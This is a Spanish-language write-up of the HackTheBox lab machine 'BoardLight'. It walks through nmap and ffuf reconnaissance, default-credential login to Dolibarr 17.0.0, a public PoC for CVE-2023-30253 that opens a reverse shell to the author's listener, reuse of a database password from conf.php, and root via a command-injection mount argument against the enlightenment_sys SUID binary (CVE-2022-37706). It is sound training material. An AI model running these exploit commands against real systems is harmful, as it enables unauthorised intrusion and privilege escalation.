
Propiedades:
- OS: Linux
- Plataforma: HackTheBox
- Nivel: Easy
- Tags: #dolibarr #suid #enightment #CVE-2023-30253 #CVE-2022-37706

![](assets/Pasted%20image%2020251218013536.png)
## Reconocimiento

Comienzo tirando un ping para comprobar conectividad.

- ttl 63 indica maquina linux

```bash
ping -c 1 10.129.231.37
PING 10.129.231.37 (10.129.231.37) 56(84) bytes of data.
64 bytes from 10.129.231.37: icmp_seq=1 ttl=63 time=109 ms

--- 10.129.231.37 ping statistics ---
1 packets transmitted, 1 received, 0% packet loss, time 0ms
rtt min/avg/max/mdev = 108.762/108.762/108.762/0.000 ms
```

Ahora realizo un escaneo con nmap para ver que puertos tenemos abiertos.

```bash
> sudo nmap -p- -Pn -n -sS -vvv --min-rate 5000 10.129.231.37
----------------------------------------------------------------
Host is up, received user-set (0.11s latency).
Scanned at 2025-12-18 01:37:27 CST for 15s
Not shown: 65533 closed tcp ports (reset)
PORT   STATE SERVICE REASON
22/tcp open  ssh     syn-ack ttl 63
80/tcp open  http    syn-ack ttl 63
```

- Puertos 22 y 80 abiertos

Sobre los puertos abiertos realizo un segundo escaneo para detectar servicios, versiones y correr un conjunto de scripts de reconocimiento.

```bash
> sudo nmap -p 80,22 -sV -sC -vvv -sS --min-rate 5000 -n -Pn 10.129.231.37 -oA nmap/target
---------------------------------------------------------------------------------------------
PORT   STATE SERVICE REASON         VERSION
22/tcp open  ssh     syn-ack ttl 63 OpenSSH 8.2p1 Ubuntu 4ubuntu0.11 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 06:2d:3b:85:10:59:ff:73:66:27:7f:0e:ae:03:ea:f4 (RSA)
| ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQDH0dV4gtJNo8ixEEBDxhUId6Pc/8iNLX16+zpUCIgmxxl5TivDMLg2JvXorp4F2r8ci44CESUlnMHRSYNtlLttiIZHpTML7ktFHbNexvOAJqE1lIlQlGjWBU1hWq6Y6n1tuUANOd5U+Yc0/h53gKu5nXTQTy1c9CLbQfaYvFjnzrR3NQ6Hw7ih5u3mEjJngP+Sq+dpzUcnFe1BekvBPrxdAJwN6w+MSpGFyQSAkUthrOE4JRnpa6jSsTjXODDjioNkp2NLkKa73Yc2DHk3evNUXfa+P8oWFBk8ZXSHFyeOoNkcqkPCrkevB71NdFtn3Fd/Ar07co0ygw90Vb2q34cu1Jo/1oPV1UFsvcwaKJuxBKozH+VA0F9hyriPKjsvTRCbkFjweLxCib5phagHu6K5KEYC+VmWbCUnWyvYZauJ1/t5xQqqi9UWssRjbE1mI0Krq2Zb97qnONhzcclAPVpvEVdCCcl0rYZjQt6VI1PzHha56JepZCFCNvX3FVxYzEk=
|   256 59:03:dc:52:87:3a:35:99:34:44:74:33:78:31:35:fb (ECDSA)
| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBK7G5PgPkbp1awVqM5uOpMJ/xVrNirmwIT21bMG/+jihUY8rOXxSbidRfC9KgvSDC4flMsPZUrWziSuBDJAra5g=
|   256 ab:13:38:e4:3e:e0:24:b4:69:38:a9:63:82:38:dd:f4 (ED25519)
|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAILHj/lr3X40pR3k9+uYJk4oSjdULCK0DlOxbiL66ZRWg
80/tcp open  http    syn-ack ttl 63 Apache httpd 2.4.41 ((Ubuntu))
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS
|_http-title: Site doesn't have a title (text/html; charset=UTF-8).
|_http-server-header: Apache/2.4.41 (Ubuntu)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

- Puerto 22 SSHL: OpenSSH 8.2p1 Ubuntu 4ubuntu0.11
- Puerto 80 HTTP: Apache httpd 2.4.41

## Enumeración

### **Puerto 80 HTTP**

- La pagina al parecer es sobre una empresa de ciberseguridad

![](assets/Pasted%20image%2020251218014050.png)

**Dominio board.htb.**

- Metemos este dominio en nuestro `/etc/hosts`

![](assets/Pasted%20image%2020251218020420.png)

**Tecnologias Web.**

- La pagina corre con Apache 2.4.1 y JQuery 3.4.1

```bash
> whatweb http://10.129.231.37/
http://10.129.231.37/ [200 OK] Apache[2.4.41], Bootstrap, Country[RESERVED][ZZ], Email[info@board.htb], HTML5, HTTPServer[Ubuntu Linux][Apache/2.4.41 (Ubuntu)], IP[10.129.231.37], JQuery[3.4.1], Script[text/javascript], X-UA-Compatible[IE=edge]
```

**Fuzzing Directorios.**

Utilizamos ffuf para descubrir directorios. pero nada interesante

```bash
ffuf -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt:FUZZ -u 'http://10.129.231.37/FUZZ' -e .php,.js,.txt,.xml,.html -ic

        /'___\  /'___\           /'___\       
       /\ \__/ /\ \__/  __  __  /\ \__/       
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      
         \ \_\   \ \_\  \ \____/  \ \_\       
          \/_/    \/_/   \/___/    \/_/       

       v2.1.0-dev'
________________________________________________

 :: Method           : GET
 :: URL              : http://10.129.231.37/FUZZ
 :: Wordlist         : FUZZ: /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
 :: Extensions       : .php .js .txt .xml .html 
 :: Follow redirects : false
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 40
 :: Matcher          : Response status: 200-299,301,302,307,401,403,405,500
________________________________________________

images                  [Status: 301, Size: 315, Words: 20, Lines: 10, Duration: 117ms]
                        [Status: 200, Size: 15949, Words: 6243, Lines: 518, Duration: 119ms]
.html                   [Status: 403, Size: 278, Words: 20, Lines: 10, Duration: 120ms]
.php                    [Status: 403, Size: 278, Words: 20, Lines: 10, Duration: 120ms]
index.php               [Status: 200, Size: 15949, Words: 6243, Lines: 518, Duration: 128ms]
contact.php             [Status: 200, Size: 9426, Words: 3295, Lines: 295, Duration: 113ms]
about.php               [Status: 200, Size: 9100, Words: 3084, Lines: 281, Duration: 113ms]
css                     [Status: 301, Size: 312, Words: 20, Lines: 10, Duration: 221ms]
do.php                  [Status: 200, Size: 9209, Words: 3173, Lines: 295, Duration: 114ms]
js                      [Status: 301, Size: 311, Words: 20, Lines: 10, Duration: 109ms]
```

**Fuzzing Subdominios.**

Denuevo utilizamos [[ffuf]] pero ahora para enumerar subdominios.

```bash
ffuf -w /usr/share/wordlists/seclists/Discovery/DNS/subdomains-top1million-110000.txt -u http://board.htb/ -H "Host: FUZZ.board.htb" -fl 518 -t 60

        /'___\  /'___\           /'___\       
       /\ \__/ /\ \__/  __  __  /\ \__/       
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      
         \ \_\   \ \_\  \ \____/  \ \_\       
          \/_/    \/_/   \/___/    \/_/       

       v2.1.0-dev'
________________________________________________

crm                     [Status: 200, Size: 6360, Words: 397, Lines: 150, Duration: 125ms]
```

- Metemos el subdominio `crm` al `/etc/hosts`

### Subdominio crm

Al entrar a `crm.board.htb` nos encontramos con `Dolibarr` en su version `17.0.0`

![](assets/Pasted%20image%2020251218020756.png)

Ingrese a Dolibarr con las credenciales default pero al parecer no tengo muchos permisos.

- admin:admin 

![](assets/Pasted%20image%2020251218020941.png)


## Explotación

Sabemos que la version de Dolibarr es 17.0.0 por lo cual busque por vulnerabilidades y me encontré con [CVE-2023-30253](https://nvd.nist.gov/vuln/detail/CVE-2023-30253) que permite la ejecución de comandos por un usuario autenticado.

Me encontré el siguiente [PoC](https://github.com/nikn0laty/Exploit-for-Dolibarr-17.0.0-CVE-2023-30253/blob/main/exploit.py) por lo cual lo descargo y lo configuro

```bash
> git clone https://github.com/Rubikcuv5/cve-2023-30253
> pip3 install -r requirements.txt
> chmod +x CVE-2023-30253.py
```

Y procedo a ejecutarlo:

```bash
> python3 CVE-2023-30253.py --url http://crm.board.htb/ -u admin -p admin -r 10.10.15.110 4444
--------------------------------------------------------------------------------------------------
[+] By Rubikcuv5.
    
[*] Url: http://crm.board.htb/
[*] User: admin
[*] Password: admin
[*] Reverseshell info:
        IP:10.10.15.110
        PORT:4444
[*] Verifying accessibility of URL:http://crm.board.htb//admin/index.php
[*] Attempting login to http://crm.board.htb//admin/index.php as admin
[+] Login successfully!
[*] Creating web site ...
[+] Web site was create successfully!
[*] Creating web page ...
[+] Web page was create successfully!
```

El script abre directamente un listener y te entabla la reverse-shell.

```bash
Listening on 0.0.0.0 4444
Connection received on 10.129.231.37 51400
sh: 0: can't access tty; job control turned off
$ id
uid=33(www-data) gid=33(www-data) groups=33(www-data)
```

## Escalada de Privilegios

Entre como el usuario `www-data` por lo cual primero enumere a los usuarios

```bash
$ cat /etc/passwd | grep sh
root:x:0:0:root:/root:/bin/bash
larissa:x:1000:1000:larissa,,,:/home/larissa:/bin/bash
fwupd-refresh:x:128:135:fwupd-refresh user,,,:/run/systemd:/usr/sbin/nologin
sshd:x:129:65534::/run/sshd:/usr/sbin/nologin
```

- Usuario larissa

Dentro del sistema busque cual era el archivo de configuración de Dolibarr y encontré que era conf.php ubicado en `/var/www/html/crm.board.htb/htdocs/conf` por lo cual le eche un vistaso.

```bash
www-data@boardlight:~/html/crm.board.htb/htdocs/conf$ conf.php

$dolibarr_main_db_host='localhost';
$dolibarr_main_db_port='3306';
$dolibarr_main_db_name='dolibarr';
$dolibarr_main_db_prefix='llx_';
$dolibarr_main_db_user='dolibarrowner';
$dolibarr_main_db_pass='serverfun2$2023!!';
$dolibarr_main_db_type='mysqli';

```

- Encuentro las credenciales para mysql

Reutilice las credenciales. para ver si funcionaba.

- larissa:serverfun2$2023!!

```bash
www-data@boardlight:~/html/crm.board.htb/htdocs/conf$ su larissa
su larissa
Password: serverfun2$2023!!

larissa@boardlight:/var/www/html/crm.board.htb/htdocs/conf$ whoami
whoami
larissa
```

Ahora busque por binarios con el bit SUID activo y me encuentro con enlightment.

```bash
larissa@boardlight:~$ find / -perm -4000 2>/dev/null
/usr/lib/eject/dmcrypt-get-device
/usr/lib/xorg/Xorg.wrap
/usr/lib/x86_64-linux-gnu/enlightenment/utils/enlightenment_sys
/usr/lib/x86_64-linux-gnu/enlightenment/utils/enlightenment_ckpasswd
/usr/lib/x86_64-linux-gnu/enlightenment/utils/enlightenment_backlight
/usr/lib/x86_64-linux-gnu/enlightenment/modules/cpufreq/linux-gnu-x86_64-0.23.1/freqset
/usr/lib/dbus-1.0/dbus-daemon-launch-helper
```

enlightment_sys es vulnerable a  [CVE-2022-37706](https://github.com/MaherAzzouzi/CVE-2022-37706-LPE-exploit/tree/main). Por lo cual ahora podemos proceder a abusar del binario para elevar nuestros privilegios.

- /tmp/net es nuestro punto de montaje enlightment_sys lo necesita

```bash
larissa@boardlight:~$ mkdir -p /tmp/net
```

- Creamos un directorio /dev/../tmp/;/tmp/exploit aprovechándonos de ; para tratar de concatenar un comando

```bash
larissa@boardlight:~$ mkdir -p "/dev/../tmp/;/tmp/exploit"
```

- Copiamos la bash al /tmp/exploit

```bash
larissa@boardlight:~$ echo "/bin/sh" > /tmp/exploit
```

- Le damos permisos de ejecución a /tmp/exploit (copia de bash)

```bash
larissa@boardlight:~$ chmod a+x /tmp/exploit
```

- Ahora cuando ejecutamos el comando final de enlightment_sys /bin/mount lo que va a suceder es algo asi:

```bash
mount /dev/../tmp/    ;    /tmp/exploit
     ↑                ↑         ↑
  (comando 1)    (separador) (comando 2)
```

- **Comando 1**: Intenta montar algo (falla, pero no importa)
- **Comando 2**: Ejecuta el script `/tmp/exploit` como root

```bash
larissa@boardlight:~$ /usr/lib/x86_64-linux-gnu/enlightenment/utils/enlightenment_sys /bin/mount -o noexec,nosuid,utf8,nodev,iocharset=utf8,utf8=0,utf8=1,uid=$(id -u), "/dev/
../tmp/;/tmp/exploit" /tmp///net
mount: /dev/../tmp/: can't find in /etc/fstab.
# id
uid=0(root) gid=0(root) groups=0(root),4(adm),1000(larissa)
# 
```

Obtenemos la flag en el directorio /root

```bash
# ls
root.txt  snap
# cat root.txt
e7901b7*****
```

***PWNED***

![](assets/Pasted%20image%2020251218030555.png)